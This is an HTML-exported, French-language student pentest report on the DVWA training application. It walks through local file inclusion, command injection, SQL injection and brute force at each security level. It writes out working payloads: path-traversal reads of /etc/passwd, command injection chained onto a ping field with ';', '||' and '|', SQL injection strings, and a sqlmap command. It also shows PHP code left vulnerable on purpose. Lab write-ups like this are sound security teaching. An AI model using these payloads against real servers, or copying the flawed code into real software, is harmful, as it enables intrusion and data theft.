@@ -1,0 +1,376 @@
+<!DOCTYPE html><html><head>
+      <title>rapport</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:///c:\Users\Sacha\.vscode\extensions\shd101wyy.markdown-preview-enhanced-0.8.15\crossnote\dependencies\katex\katex.min.css">
+      
+      
+      
+      
+      
+      <style>
+      code[class*=language-],pre[class*=language-]{color:#333;background:0 0;font-family:Consolas,"Liberation Mono",Menlo,Courier,monospace;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.4;-moz-tab-size:8;-o-tab-size:8;tab-size:8;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:.8em;overflow:auto;border-radius:3px;background:#f5f5f5}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal;background:#f5f5f5}.token.blockquote,.token.comment{color:#969896}.token.cdata{color:#183691}.token.doctype,.token.macro.property,.token.punctuation,.token.variable{color:#333}.token.builtin,.token.important,.token.keyword,.token.operator,.token.rule{color:#a71d5d}.token.attr-value,.token.regex,.token.string,.token.url{color:#183691}.token.atrule,.token.boolean,.token.code,.token.command,.token.constant,.token.entity,.token.number,.token.property,.token.symbol{color:#0086b3}.token.prolog,.token.selector,.token.tag{color:#63a35c}.token.attr-name,.token.class,.token.class-name,.token.function,.token.id,.token.namespace,.token.pseudo-class,.token.pseudo-element,.token.url-reference .token.variable{color:#795da3}.token.entity{cursor:help}.token.title,.token.title .token.punctuation{font-weight:700;color:#1d3e81}.token.list{color:#ed6a43}.token.inserted{background-color:#eaffea;color:#55a532}.token.deleted{background-color:#ffecec;color:#bd2c00}.token.bold{font-weight:700}.token.italic{font-style:italic}.language-json .token.property{color:#183691}.language-markup .token.tag .token.punctuation{color:#333}.language-css .token.function,code.language-css{color:#0086b3}.language-yaml .token.atrule{color:#63a35c}code.language-yaml{color:#183691}.language-ruby .token.function{color:#333}.language-markdown .token.url{color:#795da3}.language-makefile .token.symbol{color:#795da3}.language-makefile .token.variable{color:#183691}.language-makefile .token.builtin{color:#0086b3}.language-bash .token.keyword{color:#0086b3}pre[data-line]{position:relative;padding:1em 0 1em 3em}pre[data-line] .line-highlight-wrapper{position:absolute;top:0;left:0;background-color:transparent;display:block;width:100%}pre[data-line] .line-highlight{position:absolute;left:0;right:0;padding:inherit 0;margin-top:1em;background:hsla(24,20%,50%,.08);background:linear-gradient(to right,hsla(24,20%,50%,.1) 70%,hsla(24,20%,50%,0));pointer-events:none;line-height:inherit;white-space:pre}pre[data-line] .line-highlight:before,pre[data-line] .line-highlight[data-end]:after{content:attr(data-start);position:absolute;top:.4em;left:.6em;min-width:1em;padding:0 .5em;background-color:hsla(24,20%,50%,.4);color:#f4f1ef;font:bold 65%/1.5 sans-serif;text-align:center;vertical-align:.3em;border-radius:999px;text-shadow:none;box-shadow:0 1px #fff}pre[data-line] .line-highlight[data-end]:after{content:attr(data-end);top:auto;bottom:.4em}html body{font-family:'Helvetica Neue',Helvetica,'Segoe UI',Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ol,html body>ul{margin-bottom:16px}html body ol,html body ul{padding-left:2em}html body ol.no-list,html body ul.no-list{padding:0;list-style-type:none}html body ol ol,html body ol ul,html body ul ol,html body ul ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;background-color:#f0f0f0;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:700;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::after,html body code::before{letter-spacing:-.2em;content:'\00a0'}html body pre>code{padding:0;margin:0;word-break:normal;white-space:pre;background:0 0;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:after,html body pre code:before,html body pre tt:after,html body pre tt:before{content:normal}html body blockquote,html body dl,html body ol,html body p,html body pre,html body ul{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body code,html body pre{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview ul{list-style:disc}.markdown-preview ul ul{list-style:circle}.markdown-preview ul ul ul{list-style:square}.markdown-preview ol{list-style:decimal}.markdown-preview ol ol,.markdown-preview ul ol{list-style-type:lower-roman}.markdown-preview ol ol ol,.markdown-preview ol ul ol,.markdown-preview ul ol ol,.markdown-preview ul ul ol{list-style-type:lower-alpha}.markdown-preview .newpage,.markdown-preview .pagebreak{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center!important}.markdown-preview:not([data-for=preview]) .code-chunk .code-chunk-btn-group{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .status{display:none}.markdown-preview:not([data-for=preview]) .code-chunk .output-div{margin-bottom:16px}.markdown-preview .md-toc{padding:0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link div,.markdown-preview .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}.markdown-preview .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0;min-height:100vh}@media screen and (min-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode]) .markdown-preview{font-size:14px!important;padding:1em}}@media print{html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for=html-export]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,.66);border:4px solid rgba(150,150,150,.66);background-clip:content-box}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc{padding:0 16px}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link{display:inline;padding:.25rem 0}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link div,html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper .md-toc-link p{display:inline}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc .md-toc .md-toc-link-wrapper.highlighted .md-toc-link{font-weight:800}html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% - 300px);padding:2em calc(50% - 457px - 300px / 2);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for=html-export]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for=html-export]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+      <!-- The content below will be included at the end of the <head> element. --><script type="text/javascript">
+  document.addEventListener("DOMContentLoaded", function () {
+    // your code here
+  });
+</script></head><body for="html-export">
+    
+    
+      <div class="crossnote markdown-preview  ">
+      
+<h1 id="pentest-en-utilisant-dvwa">Pentest en utilisant DVWA </h1>
+<blockquote>
+<p>author : Sacha Besser</p>
+</blockquote>
+<h1 id="1-local-file-inclusion">1. Local File Inclusion </h1>
+<p>Une Local File Inclusion (LFI) est une vulnérabilité web qui permet à un attaquant de forcer un site à inclure et afficher des fichiers locaux présents sur le serveur.</p>
+<p>Cette faille se produit lorsque le site web inclut un fichier sans bien vérifier ou filtrer ce que l’utilisateur peut choisir.</p>
+<p>Par exemple, un site utilise une URL comme :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=file.php
+</code></pre><p>Ici, le fichier file.php est inclus par la variable page.</p>
+<p>Si l’entrée utilisateur n'est pas sécurisée, un attaquant pourrait manipuler l'URL pour inclure d'autres fichiers locaux :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
+</code></pre><h2 id="11-premier-niveau--low">1.1 Premier niveau – low </h2>
+<p>Nous avons une page toute simple avec trois fichiers<code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=include.php</code></p>
+<p><img src="images/lfi/1.png" alt="image"></p>
+<p>Nous allons donc simplement essayer de modifier le parametre pour inclure une autre page par exemple <code>/etc/passwd</code></p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
+</code></pre><p><img src="images/lfi/2.png" alt="image"></p>
+<p>On voit que la faille est bien présente puisqu’elle permet d’afficher n’importe quel fichier sur le serveur.<br>
+On peut donc en quelque sorte en déduire le code php qui est présent sur le serveur.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php  
+$page = $_GET['page'];
+include($page); ?&gt;
+</code></pre><p>Cela serait probablement quelque chose comme affiche ci-dessus. C’est-à-dire un simple paramètre <code>GET</code> sans aucune structure de contrôle.</p>
+<h2 id="12-deuxieme-niveau---medium">1.2 Deuxieme niveau - medium </h2>
+<p>Pour cette deuxieme partie, nous effectuons quelque test et nous pouvons remarquer que <code>../</code> est filtre.<br>
+Par Exemple :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=../etc/passwd
+</code></pre><p>Le resultat ci dessous montre que les <code>..</code> ont ete filtre, ainsi le serveur n'a pas affiche le fichier que l'on voulait.<br>
+<img src="images/lfi/3.png" alt="image"></p>
+<p>C'est donc assez facile ici de contourner le filtre, il suffit juste de ne pas utiliser <code>..</code>, par exemple nous pouvons acceder a la racine simplement en utilisant <code>/</code>.</p>
+<p>Ainsi en utilisant la meme commande, on arrive a la solution :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
+</code></pre><p><img src="images/lfi/2.png" alt="image"></p>
+<p>On peux donc en deduire ce que le serveur a comme code :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\\" ), "", $file );
+
+?&gt;
+</code></pre><p>Pour se faire nous allons voir la configuration de <code>dvwa</code> et on remarque que notre hypthese etait bonne, les <code>../</code> sont bien filtre mais aussi les <code>http://</code> et <code>https://</code> qui sont retires et remplaces par une chaine vide.</p>
+<h2 id="13-troisieme-niveau---high">1.3 Troisieme niveau - high </h2>
+<p>Pour la troisieme partie on va reessayer d'executer la meme commande pour voir comment le serveur reagis</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=/etc/passwd
+</code></pre><p>Cette fois ci le serveur ne nous affiche pas le fichier voulus, mais la phrase <code>ERROR: File not found!</code></p>
+<p>Il doit donc y avoir encore plus de filtre ou une strucuture de controle qui a ete ajoute</p>
+<p>Ici, n'ayant pas vraiment d'idee pour trouver la solution nous sommes alles directement voir le code php pour comprendre ce que le serveur filtrait ou non.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php
+
+$file = $_GET['page'];
+
+if( !fmatch( "file", $file ) &amp;&amp; $file != "include.php" ) {
+  // This isn't the page we want!
+  echo "ERROR: File not found!";
+  exit;
+}
+
+?&gt;
+</code></pre><p>On peux voir que le serveur verifie si le fichier que l'on recupere commence par <code>"file"</code>, ceci est en principe une bonne idee puisque les fichiers etant nomme <code>file1.php</code>, <code>file2.php</code> ..., le script est cense filtre tous les autres.</p>
+<p>Or en ayant compris cela, on en deduis que si on commence chaque "injection" par <code>file</code>, on contournera le filtre.</p>
+<p>Par exemple essayons ceci :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://34.163.97.167/DVWA/vulnerabilities/fi/?page=file/../../../../../../../../../etc/passwd
+</code></pre><p>Et encore une fois, nous arrivons a afficher le resultat de <code>/etc/passwd</code>.</p>
+<p><img src="images\lfi\4.png" alt="imaegs"></p>
+<h2 id="14-niveau-impossible">1.4 Niveau Impossible </h2>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+$configFileNames = [
+    'include.php',
+    'file1.php',
+    'file2.php',
+    'file3.php',
+];
+
+if( !in_array($file, $configFileNames) ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?&gt;
+</code></pre><p>Analysons rapidement ce code.<br>
+Le fichier est recupere dans la variable <code>file</code> puis on voit qu'il est compare a une liste contenant tous les fichiers. C'est clairement la meilleure methode puisque ici, soit le nom du fichier est egale a celui qui est dans la liste et le fichier est affiche ou il ne l'est pas et alors le message <code>ERROR : File not found</code> est affiche.</p>
+<h1 id="2-command-injection">2. Command Injection </h1>
+<p>La Command Injection est une vulnérabilité de sécurité où un attaquant peut injecter et exécuter des commandes système dans une application, souvent via une interface utilisateur. Cette vulnérabilité permet à un attaquant d'exécuter des commandes directement sur le serveur ou la machine hôte qui exécute l'application.</p>
+<p>Lorsqu'une application prend des données en entrée de l'utilisateur (par exemple via un formulaire web) et les utilise sans validation ou filtre, un attaquant peut insérer une commande système malveillante dans l'entrée. Si l'application passe cette entrée directement à un interpréteur de commande (comme le shell Linux), l'attaquant peut exécuter des commandes non autorisées sur le serveur.</p>
+<h2 id="21-premier-niveau---low">2.1 Premier niveau - low </h2>
+<p>On arrive sur une page avec un service de ping</p>
+<p><img src="images\exec\1.png" alt="images"></p>
+<p>Puisque c'est du php, on va essayer une simple methode qui consite à utiliser le caractètre <code>;</code> pour "sortir" du code php qui permet de ping, puis nous allons saisir la commande que l'on veux</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>; cat ../exec/source/low.php
+</code></pre><p>Ici par exemple nous allons afficher le code source de la page, ce qui nous permettra de visualiser en même temps comment fonctionne le serveur.</p>
+<p><img src="images\exec\2.png" alt="images"></p>
+<p>Puisque c'est du code php, il faut regarder avec <code>ctrl + u</code> pour voir le script php.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+	// Get input
+	$target = $_REQUEST[ 'ip' ];
+
+	// Determine OS and execute the ping command.
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		// Windows
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		// *nix
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
+
+	// Feedback for the end user
+	$html .= "&lt;pre&gt;{$cmd}
+</code></pre><p>On tombe sur ceci et on remarque que il n'y a aucun contrôle sur l'input de l'utilisateur. De plus on comprend mieux comment les commandes systemes sont executés. C'est a l'aide de la fonction <code>shell_exec()</code> de php.</p>
+<h2 id="22-deuxieme-niveau---medium">2.2 Deuxieme niveau - medium </h2>
+<p>Pour ce deuxieme niveau, en essayant avec <code>;</code> l'injection ne fonctionne pas. Nous avons donc cherché differents caractères propres à Linux qui aurait peut être échappé au filtre que le dévellopeur à mis en place car on se doute ici que certains caractères ont été blacklisté.</p>
+<p>Après une simple recherche sur Internet, on tombe sur un github <code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md</code> qui nous fournit quelques indications.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>; (Semicolon): Allows you to execute multiple commands sequentially.
+&amp;&amp; (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
+|| (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
+&amp; (Background): Execute the command in the background, allowing the user to continue using the shell.
+| (Pipe): Takes the output of the first command and uses it as the input for the second command.
+</code></pre><p>En essayant ces caractères, on en trouve un qui n'est pas blacklisté <code>||</code>.<br>
+Cela nos permet d'éxecuter cette commande et par la même occasion lire le code php.</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>|| cat ../exec/source/medium.php
+</code></pre><pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+	// Get input
+	$target = $_REQUEST[ 'ip' ];
+
+	// Set blacklist
+	$substitutions = array(
+		'&amp;&amp;' =&gt; '',
+		';'  =&gt; '',
+	);
+
+	// Remove any of the characters in the array (blacklist).
+	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+	// Determine OS and execute the ping command.
+	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+		// Windows
+		$cmd = shell_exec( 'ping  ' . $target );
+	}
+	else {
+		// *nix
+		$cmd = shell_exec( 'ping  -c 4 ' . $target );
+	}
+
+	// Feedback for the end user
+	$html .= 
+</code></pre><p>Notre théorie initial était correcte. On à effectivement une blacklist qui inclue le <code>;</code> et <code>&amp;&amp;</code> mais pas le <code>||</code>.</p>
+<h2 id="23-troisième-niveau---hard">2.3 Troisième niveau - hard </h2>
+<p>Pour ce troisieme challenge, on part du principe que l'administrateur a blacklist tous les caractères que l'on a cité avant. On doit donc trouver une autre manière.</p>
+<p>Cependant, en essayant plusieurs commande dans l'éventualité ou notre théorie était fausse on tombe sur cette commande qui elle fonctionne</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>|cat ../exec/source/high.php
+</code></pre><p>Le script est bien exécuté<br>
+<img src="images\exec\3.png" alt="images"></p>
+<p>On peux maintenant essayer de comprendre pourquoi 😃.<br>
+En fait la raison est probablement un oublie ou une faute de frappe puisqu'on voit que le symbole <code>|</code> n'est pas blacklisté, c'est le symbole <code>| </code> qui l'est. Cela nous permet donc d'éxecuter notre code.</p>
+<h2 id="24-niveau-impossible">2.4 Niveau impossible </h2>
+<p>Voici le code php du niveau impossible :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt;?php
+
+if( isset( $_POST[ 'Submit' ]  ) ) {
+        // Check Anti-CSRF token
+        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+        // Get input
+        $target = $_REQUEST[ 'ip' ];
+        $target = stripslashes( $target );
+
+        // Split the IP into 4 octects
+        $octet = explode( ".", $target );
+
+        // Check IF each octet is an integer
+        if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) {
+                // If all 4 octets are int's put the IP back together.
+                $target = $octet[0] . '.' . $octet[1] . '.' . $octet[2] . '.' . $octet[3];
+
+                // Determine OS and execute the ping command.
+                if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
+                        // Windows
+                        $cmd = shell_exec( 'ping  ' . $target );
+                }
+                else {
+                        // *nix
+                        $cmd = shell_exec( 'ping  -c 4 ' . $target );
+                }
+
+                // Feedback for the end user
+                $html .= "&lt;pre&gt;{$cmd}&lt;/pre&gt;";
+        }
+        else {
+                // Ops. Let the user name theres a mistake
+                $html .= '&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;';
+        }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><p>Essayons de comprendre:<br>
+Tout d'abord l'input de l'utilisateur est récupéré via <code>$_REQUEST['ip']</code> puis la fonction <code>stripslashes()</code> lui est appliqué permettant de retirer dans un premier temps les caractères spéciaux</p>
+<p>Puis l'adresse IP est vérifiée a l'aide de ce bloc de code</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>$octet = explode( ".", $target );
+if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) )
+</code></pre><p>Ce dernier va diviser l'IP en 4 parties grâce au séparateur <code>.</code> puis chaque octet est validé avec la fonction <code>is_numeric()</code> permettant de vérifier si il s'agit bien de chiffres. Finalement le script vérifie aussi la taille avec <code>size($octet) == 4</code> pour confirmer que l'adresse comporte exactement 4 partie.</p>
+<h1 id="3-sql-injection">3. SQL Injection </h1>
+<p>Une injection SQL (SQL Injection) est une faille de sécurité exploitée par un attaquant pour exécuter des commandes SQL malveillantes sur une base de données. Elle se produit lorsque des entrées utilisateur ne sont pas correctement validées ou filtrées avant d’être intégrées à une requête SQL. Cela peut permettre à un attaquant de manipuler les requêtes SQL de l'application, exposant ainsi des données sensibles ou compromettant le système</p>
+<p>Imaginons un bloc de code vulnérable tout simple :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>$username = $_POST['username'];
+$password = $_POST['password'];
+
+$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password';";
+$result = mysqli_query($conn, $query);
+</code></pre><p>Le script ci-dessus va utiliser l'input de l'utilisateur et va le concaténer avec le reste de la commande SQL. Cependant il n'y a aucun filtre.</p>
+<p>Ainsi prenons un exemple d'attaque où l'attaquant entre comme nom d'utilisateur <code>admin' --</code><br>
+La requête devient alors :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>SELECT * FROM users WHERE username = 'admin' -- ' AND password = '';
+</code></pre><p>La partie <code>-- ' AND password = '';</code> est commenté et la commande restante n'est donc plus que <code>SELECT * FROM users WHERE username = 'admin'</code>. Cela accordera donc l'accès à l'utilisateur.</p>
+<h2 id="31-premier-niveau---low">3.1 Premier niveau - low </h2>
+<p>On a une page avec la possibilié d'entrer un id d'utilisateur<br>
+<img src="images\sql\1.png" alt="images"><br>
+Cela nous renvoie l'utilisateur sans le mot de passe.</p>
+<p>On va commencer par essayer une simple injection</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>admin' OR '1'='1
+</code></pre><p>C'est quasiment le même exemple que cité auparavant sauf que l'on rajoute une condition <code>OR '1'='1</code> qui est bien sur toujours vrai. Ainsi on va tout afficher puisque la condition est toujours vrai.</p>
+<p><img src="images\sql\2.png" alt="images"></p>
+<h3 id="sqlmap">sqlmap </h3>
+<p>On va aussi essayer d'utiliser l'outil <code>sqlmap</code> pour scanner le formulaire et voir ce qu'il trouve<br>
+La commande a cette forme :</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>sqlmap -u "http://dvwa.lan/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" --cookie="PHPSESSID=sdngv7nmb11ksskl0ukjj69d46; security=low"
+</code></pre><p>On note d'ailleurs qu'il y a le cookie de session, ceci est important puisque sinon les requêtes seront redirigés à <code>login.php</code>.</p>
+<p>On a déja un résultat qui nous indique que la page peut etre injecter.<br>
+<img src="images\sql\3.png" alt="images"></p>
+<p>On à plusieurs options d'ailleurs :</p>
+<ul>
+<li>La première est de type <code>boolean-based blind</code>, cette technique ajoute une condition booléenne au paramètre afin de determiner si le résultat de la page varie</li>
+<li>La deuxieme est de type <code>error-based</code>, cette technique consiste a former une requête SQL invalide afin de voir ce que renvoie le serveur comme message d'erreur.</li>
+<li>La troisieme méthode que l'on a ici est <code>UNION query</code>, cette technique consiste à concaténer la requête executée l'application web par une requête injectée par l'outil via une opération d'union</li>
+<li>Nous avons une quatrième méthode nommée <code>Time-based blind</code>, cette technique augmente la durée d'exécution de la requête SQL de l'application web en ajoutant du code SQL effectuant des opérations coûteuses en temps</li>
+</ul>
+<p>Cette commande est relativement simple et ne nous donne pas d'informations sur base de données si ce n'est la manière dont on peux faire les injection</p>
+<h1 id="4-brute-force">4. Brute Force </h1>
+<p>Inutile d'expliquer le bruteforce, mais nous allons quand même le faire 😃.<br>
+Le bruteforce  est une méthode d'attaque utilisée pour deviner un mot de passe, une clé de chiffrement ou toute autre information sensible en essayant systématiquement toutes les combinaisons possibles jusqu'à trouver la bonne. C'est une méthode simple mais parfois efficace, surtout si les mots de passe ou clés sont faibles ou mal sécurisés.</p>
+<p>Il y a plusieurs outils disponible pour bruteforce :</p>
+<table>
+<thead>
+<tr>
+<th><strong>Outil</strong></th>
+<th><strong>Description</strong></th>
+<th><strong>Cible principale</strong></th>
+<th><strong>Site officiel/GitHub</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Hydra</strong></td>
+<td>Outil rapide pour tester des mots de passe sur divers services réseau.</td>
+<td>SSH, FTP, HTTP, SMTP, etc.</td>
+<td><a href="https://github.com/vanhauser-thc/thc-hydra">GitHub</a></td>
+</tr>
+<tr>
+<td><strong>Medusa</strong></td>
+<td>Outil de bruteforce modulaire et rapide pour les services réseau.</td>
+<td>SSH, FTP, Telnet, MySQL, etc.</td>
+<td><a href="https://github.com/jmk-foofus/medusa">GitHub</a></td>
+</tr>
+<tr>
+<td><strong>John the Ripper</strong></td>
+<td>Craqueur de mots de passe hachés puissant et configurable.</td>
